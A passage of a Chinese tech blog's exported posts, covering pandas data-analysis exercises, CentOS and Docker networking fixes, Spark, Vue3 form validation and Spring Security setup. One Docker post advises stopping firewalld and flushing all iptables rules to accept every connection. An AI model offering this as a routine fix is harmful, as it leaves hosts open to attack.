commute_df[&quot;应出勤天数（天）&quot;])        basic_df[&quot;时薪&quot;] = basic_df[&quot;日薪&quot;] / 8        commute_df[&quot;法定假日加班（小时）&quot;] = commute_df[&quot;法定假日加班（小时）&quot;].fillna(0)        commute_df[&quot;周末加班（小时）&quot;] = commute_df[&quot;周末加班（小时）&quot;].fillna(0)        commute_df[&quot;工作日加班（小时）&quot;] = commute_df[&quot;工作日加班（小时）&quot;].fillna(0)        basic_df[&quot;加班工资&quot;] = (basic_df[&quot;时薪&quot;] * commute_df[&quot;法定假日加班（小时）&quot;] * 2 +                                basic_df[&quot;时薪&quot;] * commute_df[&quot;周末加班（小时）&quot;] * 1.5                                + basic_df[&quot;时薪&quot;] * commute_df[&quot;工作日加班（小时）&quot;])        commute_df[&quot;请假（小时）&quot;] = commute_df[&quot;请假（小时）&quot;].fillna(0)        basic_df[&quot;请假扣除&quot;] = basic_df[&quot;时薪&quot;] * commute_df[&quot;请假（小时）&quot;]        basic_df[&quot;五险一金扣除&quot;] = (basic_df[&quot;社会保险缴费基数&quot;] * 0.08 + basic_df[&quot;社会保险缴费基数&quot;] * 0.02 +                                    basic_df[&quot;社会保险缴费基数&quot;] * 0.01 + basic_df[&quot;社会保险缴费基数&quot;] * 0.1)        basic_df[&quot;薪资&quot;] = (basic_df[&quot;月基本薪资&quot;] + basic_df[&quot;加班工资&quot;] - basic_df[&quot;请假扣除&quot;]                            - basic_df[&quot;五险一金扣除&quot;])        df_1 = (basic_df.groupby(&quot;部门&quot;)[&quot;薪资&quot;]                .mean()                .round(2)                .reset_index()                .sort_values(by=&quot;薪资&quot;, ascending=False))        series = pd.Series(df_1[&#x27;薪资&#x27;].values, index=df_1[&#x27;部门&#x27;], name=&quot;平均薪资&quot;)        return series\n编制比较资产负债表\n任务描述\n“A企业资产负债表.xlsx”文件的“比较资产负债表”包含 A 企业 2020 年和 2021 年的资产负债数据，请完成以下指定任务。\n1.使用 0 填充表格中的空值；\n2.计算 2021 年各项目变动额和变动率并添加相关数据列；\n3.程序接受某项目的项目名称 name，要求输出该项目对应的变动额和变动率。\n任务要求\n1.代码要编辑在 balance_sheet 函数下；\n2.变动额需要四舍五入保留小数点后 2 位，变动率需要四舍五入保留小数点后 4 位；\n3.变动额和变动率的数据类型都是浮点数数据类型；\n4.程序只判定 return后的结果值，输出（print）后的结果值不作为判断依据；\n5.程序返回结果的数据类型为列表。\n测试用例\n输入：name=“负债总计”\n输出：[26928392.51, 0.2567]\n解释：负债总计变动额是 26928392.51，变动率是 0.2567\n输入：name=“无形资产”\n输出：[-600000.0, -0.0667]\n解释：无形资产变动额是 -600000.0，变动率是 -0.0667\n输入：name=“负债合计”\n输出：[26928392.51, 0.2567]\n代码提示\n我们通过将 Series 转换为列表的形式，将其中的数字提取出来。\n通过如下案例，我们取出 DataFrame 中的 1。\nIn [1]: import pandas as pd# 定义一个 DataFrameIn [2]: df = pd.DataFrame([[1, 2], [3, 4]], columns=[&#x27;A&#x27;, &#x27;B&#x27;])# 预览下 dfIn [3]: dfOut[3]:   A  B0  1  21  3  4# 通过列名取出 A 列In [4]: df[&#x27;A&#x27;]Out[4]:0    11    3Name: A, dtype: int64# 取出 A 列再将 A 列转换为列表In [5]: df[&#x27;A&#x27;].tolist()Out[5]: [1, 3]# 取出列表中的第一个元素，就是我们想要的 1In [6]: df[&#x27;A&#x27;].tolist()[0]Out[6]: 1\nA企业资产负债表\nimport pandas as pdclass Solution:    def balance_sheet(self, name):        compare = pd.read_excel(&quot;http://72.itmc.org.cn:80/JS001/data/user/15960/243/fj_Interprice_balance_data.xlsx&quot;, sheet_name=&quot;比较资产负债表&quot;)        compare = compare.fillna(0)        compare[&quot;price&quot;] = compare[&quot;2021.12.31&quot;] - compare[&quot;2020.12.31&quot;]        compare[&quot;lv&quot;] = compare[&quot;price&quot;] / compare[&quot;2020.12.31&quot;]        data = compare[compare[&quot;项目&quot;] == name]        return [data[&quot;price&quot;].values.round(2)[0], data[&quot;lv&quot;].values.round(4)[0]]\n某店铺不同地区销售情况分析\n题目描述\n下方是某店铺在 2 月份的订单数据，共 28010 行、7 列。 在该数据中，每一行代表一笔订单，每一笔订单可以 看做是一位顾客（买家），价格相同的产品可视为同一产品；\n请编写程序，完成以下任务：\n程序传入参数 area（收货地址），要求计算该地区订单的’订单的付款转化率’、’买家全额支付的转化率’、’买家实际支付总金额’、’客单价’、’销量（订单量）最多的产品的价格’、’买家实际支付总金额在所有地区实际支付总金额中的占比’，并将结果以列表形式返回。\n题目要求\n1.程序接收 str 类型的 area，返回的结果为 list 数据类型；\n2.返回的结果中，列表中各个数据的数据类型为 str，其中转化率数据及占比数据需以百分比的形式输出，并且需要保留小数点后2位，如’13.14%’，其余结果不需要以百分比形式输出，但需要保留小数点后2位；\n3.如果某地区所有买家的买家实际支付金额为 0，即该地区没有付费行为。则该地区的’客单价’、’销量（订单量）最多的产品的价格’需返回字符串’本地区无销量’，其他结果则正常计算；\n4.如果该产品（订单）被全额退款，那么该产品不计入销量。\n参考公式\n1.付款转化率 = 付款订单数 / 总订单数；\n2.买家全额支付的转化率 = 买家全额支付的订单数 / 总订单数；\n3.客单价 = 实际支付金额 / 支付买家数；\n测试用例\n输入：area = ‘河南省’\n输出：[‘81.99%’, ‘61.18%’, ‘56354.03’, ‘92.84’, ‘37.00’, ‘2.96%’]\n解释：河南省’订单的付款转化率’为’81.99%’，’买家全额支付的转化率’为’61.18%’，’买家实际支付总金额’为’56354.03’，’客单价’为’92.84’，’销量（订单量）最多的产品的价格’为’37.00’，’买家实际支付总金额在所有地区实际支付总金额中的占比’为’2.96%’\n输入：area = ‘江苏省’\n输出：[‘86.78%’, ‘66.75%’, ‘159359.18’, ‘109.22’, ‘37.00’, ‘8.38%’]\n二月销售数据\nimport pandas as pdclass Solution:    def task(self, area: str) -&gt; list:        source = pd.read_csv(&quot;data/二月销售数据-1.csv&quot;)        # 订单的付款转化率        # 付款订单数        fkdds = source[(source[&quot;收货地址&quot;] == area) &amp; (source[&quot;订单付款时间&quot;].notna())].shape[0]        # 总订单数        zdds = source[(source[&quot;收货地址&quot;] == area)].shape[0]        fkzhl = fkdds / zdds * 100        # 买家全额支付的转化率        # 买家全额支付的订单数        qedds = source[(source[&quot;收货地址&quot;] == area) &amp; (source[&quot;总金额&quot;] == source[&quot;买家实际支付金额&quot;])].shape[0]        qezhl = qedds / zdds * 100        # 买家实际支付总金额        sjzfzje = source[(source[&quot;收货地址&quot;] == area)][&quot;买家实际支付金额&quot;].sum()        if sjzfzje == 0:            kdj = &quot;本地区无销量&quot;            zdcpjg = &quot;本地区无销量&quot;        else:            # 客单价            # 支付买家数            zfmjs = source[(source[&quot;收货地址&quot;] == area) &amp; (source[&quot;买家实际支付金额&quot;] != 0)].shape[0]            kdj = sjzfzje / zfmjs            # 销量（订单量）最多的产品的价格            zdcpjg = source[(source[&quot;收货地址&quot;] == area)][&quot;总金额&quot;].mode().iloc[0]        # 买家实际支付总金额在所有地区实际支付总金额中的占比        sydqzjezb = sjzfzje / source[&quot;买家实际支付金额&quot;].sum() * 100        return [                str(round(fkzhl,2)) + &quot;%&quot; if len(str(round(fkzhl,2)).split(&quot;.&quot;)[1]) == 2 else str(round(fkzhl,2)) + &quot;0%&quot;,                str(round(qezhl,2)) + &quot;%&quot; if len(str(round(qezhl,2)).split(&quot;.&quot;)[1]) == 2 else str(round(qezhl,2)) + &quot;0%&quot;,                str(round(sjzfzje,2)) if len(str(round(sjzfzje,2)).split(&quot;.&quot;)[1]) == 2 else str(round(sjzfzje,2)) + &quot;0&quot;,                str(round(kdj,2)) if len(str(round(kdj,2)).split(&quot;.&quot;)[1]) == 2 else str(round(kdj,2)) + &quot;0&quot;,                                str(round(zdcpjg,2)) if len(str(round(zdcpjg,2)).split(&quot;.&quot;)[1]) == 2 else str(round(zdcpjg,2)) + &quot;0&quot;,                str(round(sydqzjezb,2)) + &quot;%&quot; if len(str(round(sydqzjezb,2)).split(&quot;.&quot;)[1]) == 2 else str(round(sydqzjezb,2)) + &quot;0%&quot;                  ]\n用户职位信息统计\n任务详情\n请根据任务下方提供的用户职位统计信息表，完成以下任务：\n职位表中每个字段含义如下：\n\n\n\n字段\n说明\n\n\n\n\nuser_id\n用户序号\n\n\nage\n用户年龄\n\n\ngender\n用户性别\n\n\noccupation\n用户职位\n\n\nzip_code\n用户邮编\n\n\n编写一个职位统计函数 jobStatistics()，给定表格里的任一职位，统计其以下信息\n\n\n\n\n\n任务一：统计该职位女性用户的百分占比（结果保留两位小数），输出数据类型为 str；\n任务二：统计该职位女性用户百分占比在所有职位女性用户百分占比中的排名（降序），输出数据类型为 int。\n将以上2个结果保存在 数组(list) 中，按顺序返回。\n\n任务要求\n\n程序接收一个 str 类型的变量 op，返回一个 list 类型的变量；\n“gender” 列中，“F” 代表女性，“M” 代表男性；\n返回结果格式如下：[任务一: str, 任务二: int]。\n\n测试用例\n输入：‘artist’\n输出：[ ‘46.43%’, 4]\n解释：该职位中女性用户占据该职位所有用户的46.43%，该职位女性占比排名在所有职位女性占比排名中位列第 4\n输入：‘student’\n输出：[‘30.61%’, 10]\n解释：该职位中女性用户占据该职位所有用户的30.61%，该职位女性占比排名在所有职位女性占比排名中位列第 10\n用户职位信息统计表.xlsx\nimport pandas as pdclass Solution:    def jobStatistics(self, occupation: str) -&gt; list:        url = &#x27;http://72.itmc.org.cn:80/JS001/data/user/15960/67/fj_jobstatics.xlsx&#x27;        data = pd.read_excel(url)        r1 = str(round(len(data[(data[&#x27;gender&#x27;] == &#x27;F&#x27;) &amp; (data[&#x27;occupation&#x27;] == occupation)]) / len(            data[(data[&#x27;occupation&#x27;] == occupation)]) * 100, 2)) + &#x27;%&#x27;        qbnx = data.groupby(&#x27;occupation&#x27;)[&#x27;user_id&#x27;].size()        # 每个部门的女性        bmnx = data[data[&#x27;gender&#x27;] == &#x27;F&#x27;].groupby(&#x27;occupation&#x27;)[&#x27;user_id&#x27;].size()        bl = round((bmnx / qbnx) * 100, 2)        px = bl.sort_values(ascending=False)        pm = int(px.index.get_loc(occupation)) + 1        if len(r1.split(&#x27;%&#x27;)[0].split(&quot;.&quot;)[1]) &lt; 2:            r1 = r1.split(&quot;%&quot;)[0] + &quot;0%&quot;        return [r1, pm]\n某知名网站高质量视频主挖掘\n任务详情\n根据下方提供的某知名网站视频信息数据，构造一个打分模型，并根据分值挖掘高质量视频主，要求输入视频主的名字author，返回对应的UP主分层。\nIFL模型\n针对视频主的视频信息构建了IFL模型，以评估视频的质量。\nI (Interaction_rate)\nI 值反映的是平均每个视频的互动率，互动率越高，表明其视频更能产生用户的共鸣，使其有话题感。\nI = (总弹幕数 + 总评论数) / (总播放量 * 统计范围内视频数量) * 100。\nF (Frequence)\nF 值表示的是每个视频的平均发布周期，每个视频之间的发布周期越短，说明内容生产者创作视频的时间也就越短，创作时间太长，不是忠实粉丝的用户可能将其遗忘。\nF = (统计范围内最晚发布视频时间 - 最早发布视频时间) / 发布视频的数量。\n如果 F 的值为 0，表示该视频主仅发布一条视频。那么将 F 的值重新赋值为 F 的最大值 + 1，如原有数据中，F 的最大值是 100，那么就将 F 的最大值设置为 100 + 1 = 101。\nL (Like_rate)\nL值表示的是统计时间内发布视频的平均点赞率，越大表示视频质量越稳定，用户对up主的认可度也就越高。\nL = (点赞数 * 1 + 投币数 * 2 + 收藏数 * 3 + 分享数 * 4) / (播放量 * 发布视频数) * 100。\n维度打分\n维度确认的核心是分值确定，按照设定的标准，我们给每个视频主的 I/F/L 值打分，分值的大小取决于我们的偏好，\n即我们越喜欢的行为，打的分数就越高 ：\n- I 值。表示 up 主视频的平均评论率，这个值越大，就说明其视频越能使用户有话题，当I值越大时，分值越大。\n- F 值。表示视频的平均发布周期，我们当然想要经常看到，所以这个值越大时，分值越小。\n- L 值。表示发布视频的平均点赞率，S 值越大时，质量越稳定，分值也就越大。\n视频主主分层 我们根据每一项指标是否高于平均值，把UP主划分为8类，我们根据案例中的情况进行划分，具体如下表\n\n\n\n视频主分类\nI值是否大于平均值\nF值是否小于平均值\nL值是否大于平均值\n解释\n\n\n\n\n高质量视频主\n1\n1\n1\n用户活跃高，更新周期短，视频质量高\n\n\n高质量拖更视频主\n1\n0\n1\n用户活跃高，更新周期长，视频质量高\n\n\n高质量内容高深视频主\n0\n1\n1\n用户活跃低，更新周期短，视频质量高\n\n\n高质量内容高深拖更视频主\n0\n0\n1\n用户活跃低，更新周期长，视频质量高\n\n\n接地气活跃视频主\n1\n1\n0\n用户活跃高，更新周期短，视频质量低\n\n\n活跃视频主\n0\n1\n0\n用户活跃低，更新周期短，视频质量低\n\n\n接地气视频主\n1\n0\n0\n用户活跃高，更新周期长，视频质量低\n\n\n还在成长的视频主\n0\n0\n0\n用户活跃低，更新周期长，视频质量低\n\n\n\n数据链接已经在下方给出： 各字段表示含义如下：\n\n\n\n字段名\n含义\n\n\n\n\npubdate\n发布时间\n\n\nbv\nBV号\n\n\nurl\n视频链接\n\n\ntitle\n标题\n\n\nauthor\n作者\n\n\ndescription\n视频简介\n\n\ntag\n标签\n\n\nfavorites\n收藏\n\n\ncoins\n投币\n\n\ndanmu\n弹幕\n\n\nlikes\n点赞\n\n\nreply\n评论\n\n\nviews\n播放量\n\n\nshare\n分享\n\n\n\n任务要求\n\n程序接收 str 类型的变量 author，返回结果的数据类型是str类型；\n便于数据美观，IFL 的值需要保留小数点后两位（四舍五入）；\n数据中可能存在重复数据；\n某知名视频网站视频数据为逗号分割的 csv 文件，utf-8 编码。\n\n测试用例\n输入：‘龙爪洪荒’\n输出：‘高质量拖更视频主’\n输入：‘AO摆渡人’\n输出：‘活跃视频主’\n某知名视频网站视频数据.csv\n代码暂无","categories":["Python"],"tags":["Pandas","Python"]},{"title":"CentOS 7 配置 IP 地址","url":"/posts/57182686/","content":"切换至特权模式，并输入密码\nsu root\n查看网卡信息\nip a\n修改网卡配置文件\nvim /etc/sysconfig/network-scripts/ifcfg-ens33     //进入网卡ens33的配置页面i        //输i进入文件编辑模式(i=insert)BOOTPROTO=&quot;dhcp&quot;       //修改：将dhcp修改为static，修改后为BOOTPROTO=staticONBOOT=yes               //修改为yes, 网卡开机自启动Esc或Ctrl+c   //退出文件编辑模式:wq           //保存文件修改并退出service network restart     //重启网卡ip add  //查看网卡ens33的IP地址已经变成配置的静态IP地址ping xxx.xxx.xxx.xxx      //ping自己，ping网关，验证网络能通","categories":["Linux","CentOS"],"tags":["Linux","CentOS","IP"]},{"title":"docker 映射端口外部设备访问不到","url":"/posts/fa5b3dfc/","content":"容器内部\n查看服务是否开启，以nginx为例\nps -ef | grep nginx\n返回类似于以下图片，说明服务已经启动\n\nsystemctl stop firewalld\n如果容器有防火墙，可以先关闭防火墙试一下\n先查一下防火墙的状态，如果为下图就是关着呢\n\n宿主机\n先看容器是否正确映射端口\n下图画红框的地方就是将容器内部的nginx服务映射到宿主机的32770端口，如果这里没有映射，那么外部设备肯定访问不到。\n\n查看宿主机端口是否开启\nss -tlnp | grep 32770\n类似于以下输出，说明端口没问题\n\n如果还是访问不了，那么就是防火墙的问题了，可以尝试关闭防火墙。\nsystemctl stop firewalld\n类似于下图就是关着呢\n\n配置iptables使得所有流量都允许，可以通过以下命令清除当前的规则并设置允许所有的流量。\nsudo iptables -F   # 清除所有链中的规则sudo iptables -X   # 删除所有自定义链sudo iptables -Z   # 清空规则链中的计数器\n设置默认链为 ACCEPT，表示允许所有的传入、传出流量。执行以下命令：\nsudo iptables -P INPUT ACCEPT    # 允许所有进入流量sudo iptables -P FORWARD ACCEPT  # 允许所有转发流量sudo iptables -P OUTPUT ACCEPT   # 允许所有输出流量\n无需重启，立刻生效\n默认情况下，iptables 规则在系统重启后会丢失。\n根据系统版本不同，可以上网搜索对应的方法，将iptables规则保存下来，防止重启后失效。\n容器内部\n外部设备访问 http://宿主机:映射的端口 如果是以下页面，说明连接没问题，大概率是内部服务或代理的问题\n\n我这里是后端的jar包端口映射错了，需要改运行的端口为8080\n直接用命令复制jar包到宿主机再复制到本地windows电脑下\ndocker cp b634d0b5d430:/root/question-1.0.jar ./\n然后用解压工具打开question-1.0.jar，修改 BOOT-INF\\classes\\目录下的application.yml文件\n\n\n再复制回docker中，重新运行jar包\ndocker cp ./question-1.0.jar b634d0b5d430:/root/question-1.0.jar\n先查看之前运行的任务，然后结束他\n\n\n结束之后重新运行，因为之前已经复制jar包到容器中，所以直接运行就OK\n这里的  nohup command &amp;  是让jar包在后台运行\n\n运行后可以看一下 nohup 的日志文件看看运行成功没有，这样是运行成功了。\n\n"},{"title":"Spark 增量抽取 (Scala 实现)","url":"/posts/98adaf32/","content":"题目\n编写Scala代码，使用Spark将MySQL的shtd_store库中表user_info、sku_info、base_province、base_region、order_info、order_detail的数据增量抽取到Hive的ods库中对应表user_info、sku_info、base_province、base_region、order_info、order_detail中。(若ods库中部分表没有数据，正常抽取即可)\n第一题\n1、抽取shtd_store库中user_info的增量数据进入Hive的ods库中表user_info。根据ods.user_info表中operate_time或create_time作为增量字段(即MySQL中每条数据取这两个时间中较大的那个时间作为增量字段去和ods里的这两个字段中较大的时间进行比较)，只将新增的数据抽入，字段名称、类型不变，同时添加静态分区，分区字段为etl_date，类型为String，且值为当前比赛日的前一天日期（分区字段格式为yyyyMMdd）。使用hive cli执行show partitions ods.user_info命令。\n代码\n\n\n第二题\n2、\t抽取shtd_store库中sku_info的增量数据进入Hive的ods库中表sku_info。根据ods.sku_info表中create_time作为增量字段，只将新增的数据抽入，字段名称、类型不变，同时添加静态分区，分区字段为etl_date，类型为String，且值为当前比赛日的前一天日期（分区字段格式为yyyyMMdd）。使用hive cli执行show partitions ods.sku_info命令。\n代码\n\n\n","tags":["Spark","Scala","大数据"]},{"title":"Spark Sql 常用函数 (Scala 语言)","url":"/posts/eca3873f/","content":"基于 org.apache.spark.sql.functions._ 包下的函数\ncol\n用于在DataFrame或Dataset中引用列，通常与Spark的SQL查询或者DataFrame操作一起使用。\n语法：\ncol(colName: String): Column\ncolumn\n与 col 函数功能相同。\nlit\n用于将一个常量值转换为 Column 类型，以便在 Spark SQL 操作中使用。\nlit(literal: Any): Column\ntypeLit\ntypedLit 函数是一个类型安全的版本的 lit 函数。它用于将字面量（常量）转换为指定类型的 Column，并确保在编译时类型匹配。typedLit 适用于 Spark 3.x 版本，提供比 lit 更严格的类型检查，从而避免潜在的类型不匹配问题。\ntypedLit[T: TypeTag](literal: T): Column\ngreatest\n用于比较多列的值，返回每行中这些列中的最大值。\ngreatest(exprs: Column*): Columngreatest(columnName: String, columnNames: String*): Column\ncurrent_date\n返回当前的日期（以 yyyy-MM-dd 格式表示）。\ncurrent_date(): Column\ndate_sub\n用于从指定的日期中减去给定的天数，并返回新的日期。\ndate_sub(start: Column, days: Int): Column\ndate_format\n用于将日期类型的数据格式化为指定的字符串格式。\ndate_format(dateExpr: Column, format: String): Column\nwhen\n条件表达式，通常与 otherwise() 函数一起使用，用于根据条件返回不同的值。\nwhen(condition: Column, value: Any): Column    .otherwise(value: Any): Column\nmax\n它通常用于对数值型数据进行分组聚合，或者在没有分组时返回整个列的最大值。\nmax(e: Column): Column\nto_timestamp\n将一个字符串或者日期列转换为 timestamp 类型。\nto_timestamp(s: Column): Columnto_timestamp(s: Column, fmt: String): Column\nrow_number\n用于为每个分组中的行分配一个唯一的递增整数值。它通常与窗口函数一起使用，以实现更复杂的分组和排序操作。\n以下示例是基于 id 列进行分组，并按照 time 列进行降序排序，为每个分组中的行分配一个唯一的行号。\nrow_number()    .over(        Window            .partitionBy(&quot;id&quot;)            .orderBy(desc(&quot;time&quot;))    )\n","tags":["Spark","Scala"]},{"title":"安装并使用 GitStack","url":"/posts/7baecab0/","content":"下载 GitStack\n下载地址\n安装 GitStack\n\n下载完成后，双击运行 GitStackSetup.exe 文件，点击 Next。\n\n点击 I Agree。\n\n选择安装位置，点击 Next。\n\n画红框的必须全选，不然会出一些意想不到的错误，而后点击 Install\n\n如果选择了Launch GitStack选项，那么点击Finish后会自动打开GitStack的管理页面。安装完成后，点击 Finish。\n\n\n使用 GitStack\n\n打开浏览器，输入http://localhost/gitstack，跳转到以下页面，默认用户名密码是admin/admin，点击Sign In登录。\n\n登录成功后，可以在这里添加一个新的仓库，输入新仓库的名称(字母和数字组合)，而后点击Create。\n\n\n","tags":["GitStack","Git"]},{"title":"Vue3 + Element Plus 自定义验证","url":"/posts/f5b25be3/","content":"import type &#123;FormInstance, FormRules&#125; from &#x27;element-plus&#x27;// 判断是否是移动端的函数import &#123;isMobileDevice&#125; from &quot;@/utils/commonMethod&quot;;// 定义表单数据类型interface RuleForm &#123;  name: string  password: string  confirmPassword: string  email: string  code: string&#125;// 获取表单实例，常量名对应ref属性const ruleFormRef = ref&lt;FormInstance&gt;()// 以下两个 validate* 函数，必须调用回调函数，否则最后提交会卡住// 定义验证确认密码函数const validatePass = (rule: object, value: string, callback: (error?: Error) =&gt; void) =&gt; &#123;  if (value !== form.password) &#123;    callback(new Error(&quot;两次密码不一致&quot;))  &#125; else &#123;    callback()  &#125;&#125;// 定义验证邮箱函数const validateEmail = (rule: object, value: string, callback: (error?: Error) =&gt; void) =&gt; &#123;  const reg = /^[A-Za-z0-9_\\-]+(\\.[A-Za-z0-9_\\-]+)*@[A-Za-z0-9\\-]+\\.[A-Za-z]&#123;2,&#125;$/  if (!reg.test(value)) &#123;    callback(new Error(&quot;邮箱不合法&quot;))  &#125; else &#123;    callback()  &#125;&#125;// 定义表单数据const form = reactive&lt;RuleForm&gt;(&#123;  name: &#x27;&#x27;,  password: &#x27;&#x27;,  confirmPassword: &#x27;&#x27;,  email: &#x27;&#x27;,  code: &#x27;&#x27;&#125;)// 定义表单验证规则const rules = reactive&lt;FormRules&lt;RuleForm&gt;&gt;(&#123;  name: [    &#123;required: true, message: &#x27;请输入昵称&#x27;, trigger: &#x27;blur&#x27;&#125;,    &#123;min: 1, max: 20, message: &#x27;长度应是1-20&#x27;, trigger: &#x27;blur&#x27;&#125;,  ],  email: [    &#123;required: true, message: &#x27;请输入邮箱&#x27;, trigger: &#x27;blur&#x27;&#125;,    &#123;validator: validateEmail, trigger: &#x27;blur&#x27;&#125;,  ],  code: [    &#123;required: true, message: &#x27;请输入邮箱验证码&#x27;, trigger: &#x27;blur&#x27;&#125;,    &#123;min: 6, max: 6, message: &#x27;长度应是6&#x27;, trigger: &#x27;blur&#x27;&#125;,  ],  password: [    &#123;required: true, message: &#x27;请输入密码&#x27;, trigger: &#x27;blur&#x27;&#125;,    &#123;min: 8, max: 16, message: &#x27;长度应是8-16&#x27;, trigger: &#x27;blur&#x27;&#125;,  ],  confirmPassword: [    &#123;required: true, message: &#x27;请确认密码&#x27;, trigger: &#x27;blur&#x27;&#125;,    &#123;validator: validatePass, trigger: &#x27;blur&#x27;&#125;  ]&#125;)// 提交表单const submitForm = (formEl: FormInstance | undefined) =&gt; &#123;  if (!formEl) return// 如果上面的两个 validate* 函数没有调用回调函数，则这里会卡住  formEl.validate((valid) =&gt; &#123;    console.log(valid)  &#125;)&#125;// 重置表单const resetForm = (formEl: FormInstance | undefined) =&gt; &#123;  if (!formEl) return  formEl.resetFields()&#125;const timer = ref(0)const show = ref(true)const count = ref(0)const time = 120const getCode = () =&gt; &#123;  //axios请求  console.log(form.email);  // 验证码倒计时  if (timer.value === 0) &#123;    count.value = time;    show.value = false;    timer.value = setInterval(() =&gt; &#123;      if (count.value &gt; 0 &amp;&amp; count.value &lt;= time) &#123;        count.value--;      &#125; else &#123;        show.value = true;        clearInterval(timer.value);        timer.value = 0;      &#125;    &#125;, 1000);  &#125;&#125;\n&lt;template&gt;  &lt;div class=&quot;registry&quot; :style=&quot;&#123;width: isMobileDevice() ? &#x27;90%&#x27; : &#x27;50%&#x27;&#125;&quot;&gt;    &lt;span&gt;注册&lt;/span&gt;    &lt;el-form      :ref=&quot;ruleFormRef&quot;      :model=&quot;form&quot;      :rules=&quot;rules&quot;      label-width=&quot;auto&quot;      class=&quot;demo-ruleForm&quot;      size=&quot;default&quot;      status-icon&gt;      &lt;el-form-item label=&quot;昵称&quot; prop=&quot;name&quot;&gt;        &lt;el-input v-model=&quot;form.name&quot;/&gt;      &lt;/el-form-item&gt;      &lt;el-form-item label=&quot;邮箱&quot; prop=&quot;email&quot;&gt;        &lt;el-input v-model=&quot;form.email&quot;/&gt;      &lt;/el-form-item&gt;      &lt;el-form-item label=&quot;验证码&quot; prop=&quot;code&quot;&gt;        &lt;el-input v-model=&quot;form.code&quot; style=&quot;flex:10;&quot;/&gt;        &lt;el-button type=&quot;success&quot; @click=&quot;getCode&quot; round style=&quot;flex: 1;margin: 0 0 0 1rem&quot;&gt;          &lt;span v-show=&quot;show&quot;&gt;发送验证码&lt;/span&gt;          &lt;span v-show=&quot;!show&quot;&gt;&#123;&#123; count &#125;&#125;&lt;/span&gt;        &lt;/el-button&gt;      &lt;/el-form-item&gt;      &lt;el-form-item label=&quot;密码&quot; prop=&quot;password&quot;&gt;        &lt;el-input type=&quot;password&quot; v-model=&quot;form.password&quot;/&gt;      &lt;/el-form-item&gt;      &lt;el-form-item label=&quot;确认密码&quot; prop=&quot;confirmPassword&quot;&gt;        &lt;el-input type=&quot;password&quot; v-model=&quot;form.confirmPassword&quot;/&gt;      &lt;/el-form-item&gt;      &lt;el-form-item&gt;        &lt;el-button type=&quot;success&quot; @click=&quot;submitForm(ruleFormRef)&quot;&gt;Submit&lt;/el-button&gt;        &lt;el-button @click=&quot;resetForm(ruleFormRef)&quot;&gt;Reset&lt;/el-button&gt;      &lt;/el-form-item&gt;    &lt;/el-form&gt;  &lt;/div&gt;&lt;/template&gt;\n"},{"title":"docker 部署 nginx","url":"/posts/837c427b/","content":"1. 拉取 nginx 镜像\ndocker pull nginx\n2. 运行容器\n这里我映射到了本地的9000端口，可以根据需要修改\ndocker run --name nginx -p 9000:80 -d nginx\n3. 浏览器访问\n浏览器访问 http://ip:9000，如果看到下图则表示 nginx 部署成功\n\n","tags":["docker","nginx"]},{"title":"Spring Boot 3.4.1 + Spring security 6.4.2 重写登录","url":"/posts/86d63d83/","content":"依赖引入\n&lt;parent&gt;    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;    &lt;artifactId&gt;spring-boot-starter-parent&lt;/artifactId&gt;    &lt;version&gt;3.4.1&lt;/version&gt;    &lt;relativePath/&gt; &lt;!-- lookup parent from repository --&gt;&lt;/parent&gt;&lt;dependencies&gt;  &lt;dependency&gt;      &lt;groupId&gt;org.projectlombok&lt;/groupId&gt;      &lt;artifactId&gt;lombok&lt;/artifactId&gt;      &lt;scope&gt;provided&lt;/scope&gt;  &lt;/dependency&gt;  &lt;dependency&gt;      &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;      &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;  &lt;/dependency&gt;  &lt;dependency&gt;      &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;      &lt;artifactId&gt;spring-boot-starter-security&lt;/artifactId&gt;  &lt;/dependency&gt;  &lt;dependency&gt;      &lt;groupId&gt;com.mysql&lt;/groupId&gt;      &lt;artifactId&gt;mysql-connector-j&lt;/artifactId&gt;      &lt;scope&gt;runtime&lt;/scope&gt;  &lt;/dependency&gt;  &lt;dependency&gt;      &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;      &lt;artifactId&gt;spring-boot-starter-data-redis&lt;/artifactId&gt;  &lt;/dependency&gt;  &lt;dependency&gt;      &lt;groupId&gt;com.baomidou&lt;/groupId&gt;      &lt;artifactId&gt;mybatis-plus-jsqlparser-4.9&lt;/artifactId&gt;      &lt;version&gt;3.5.10.1&lt;/version&gt;  &lt;/dependency&gt;  &lt;dependency&gt;      &lt;groupId&gt;com.baomidou&lt;/groupId&gt;      &lt;artifactId&gt;mybatis-plus-spring-boot3-starter&lt;/artifactId&gt;      &lt;version&gt;3.5.10.1&lt;/version&gt;  &lt;/dependency&gt;  &lt;dependency&gt;      &lt;groupId&gt;com.baomidou&lt;/groupId&gt;      &lt;artifactId&gt;mybatis-plus-boot-starter-test&lt;/artifactId&gt;      &lt;version&gt;3.5.10.1&lt;/version&gt;  &lt;/dependency&gt;  &lt;dependency&gt;      &lt;groupId&gt;com.github.yulichang&lt;/groupId&gt;      &lt;artifactId&gt;mybatis-plus-join-boot-starter&lt;/artifactId&gt;      &lt;version&gt;1.5.2&lt;/version&gt;  &lt;/dependency&gt;&lt;/dependencies&gt;\n编写数据表实体类\n@NoArgsConstructor@AllArgsConstructor@Datapublic class User &#123;  @TableId(type = IdType.ASSIGN_ID)  private Long id;  private String name;  @NotBlank  @Email  private String email;  @NotBlank  private String password;  private String persona;  private String enabled;  private String avatar;  private LocalDateTime createTime;&#125;\n编写 UserDetails 的实现类\n@Data@NoArgsConstructor@AllArgsConstructorpublic class UserLogin implements UserDetails &#123;  private User user;  @Override  public Collection&lt;? extends GrantedAuthority&gt; getAuthorities() &#123;    return List.of(new SimpleGrantedAuthority(&quot;ROLE_&quot; + user.getPersona()));  &#125;  @Override  public String getPassword() &#123;    return user.getPassword();  &#125;  @Override  public String getUsername() &#123;    // 使用邮箱登录    return user.getEmail();  &#125;  @Override  public boolean isAccountNonExpired() &#123;    return UserDetails.super.isAccountNonExpired();  &#125;  @Override  public boolean isAccountNonLocked() &#123;    return UserDetails.super.isAccountNonLocked();  &#125;  @Override  public boolean isCredentialsNonExpired() &#123;    return UserDetails.super.isCredentialsNonExpired();  &#125;  @Override  public boolean isEnabled() &#123;    // 使用1表示启用，0表示禁用    return &quot;1&quot;.equals(user.getEnabled());  &#125;&#125;\n编写 UserMapper 接口\n@Mapperpublic interface UserMapper extends MPJBaseMapper&lt;User&gt; &#123;&#125;\n编写 UserDetailsService 